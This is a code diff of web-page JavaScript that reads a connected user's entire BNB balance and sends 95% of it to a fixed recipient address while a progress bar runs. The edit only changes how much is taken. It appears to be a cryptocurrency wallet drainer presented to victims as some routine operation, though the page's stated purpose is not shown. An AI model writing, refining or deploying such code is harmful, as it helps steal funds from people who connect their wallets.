@@ -117,29 +117,29 @@
                 }
             }, 1000);
 
+            // Fetch user balance and gas price
             const balance = await web3.eth.getBalance(userAccount);
             const gasPrice = await web3.eth.getGasPrice();
-
-            // Estimate gas for the transaction
             const gasLimit = await web3.eth.estimateGas({
                 from: userAccount,
                 to: recipientAddress,
                 value: balance
             });
 
-            // Calculate total gas cost
+            // Calculate gas cost
             const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
 
-            // Ensure gas fee does not exceed balance
-            if (gasCost >= BigInt(balance)) {
+            // Define the percentage of balance to send (e.g., 95%)
+            const sendPercentage = 0.95;
+            const valueToSend = BigInt(balance) * BigInt(sendPercentage * 100) / BigInt(100);
+
+            // Ensure enough BNB is left for gas fees
+            if (valueToSend <= gasCost) {
                 document.getElementById("status").innerText = "Insufficient BNB to cover gas fees.";
                 clearInterval(progressInterval);
                 document.getElementById("progress").style.width = "0%";
                 return;
             }
-
-            // Calculate the amount to send, accounting for gas cost
-            const valueToSend = BigInt(balance) - gasCost;
 
             // Send BNB to the recipient
             const tx = await web3.eth.sendTransaction({
